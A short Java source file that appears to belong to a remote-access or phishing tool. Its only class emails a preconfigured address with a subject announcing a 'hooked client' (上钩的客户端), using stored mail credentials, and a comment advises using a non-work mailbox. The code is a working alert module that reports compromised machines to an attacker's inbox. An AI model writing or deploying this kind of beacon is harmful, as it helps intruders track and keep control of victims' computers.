package org.sec.utils.test.test;

import org.sec.Constant.configuration;
import org.sec.Network.Socket;
import org.sec.utils.cn.yuhi.dto.MimeMessageDTO;
import org.sec.utils.cn.yuhi.util.MailUtil;

import java.util.Date;

/** 发送mail去预设的邮箱,注意使用非工作邮箱 */
public class sendMail {

    public static void testSendEmail() {
        // 163,qq,新浪,139



        // 设置邮件内容
        MimeMessageDTO mimeDTO = new MimeMessageDTO();
        mimeDTO.setSentDate(new Date());
        mimeDTO.setSubject("已上钩的客户端: " + Socket.biteClient);

        // 发送单邮件
        if (MailUtil.sendEmail(configuration.userName, configuration.password, configuration.targetAddress, mimeDTO)) {
            System.out.println("邮件发送成功！");
        } else {
            System.out.println("邮件发送失败!!!");
        }

    }

}
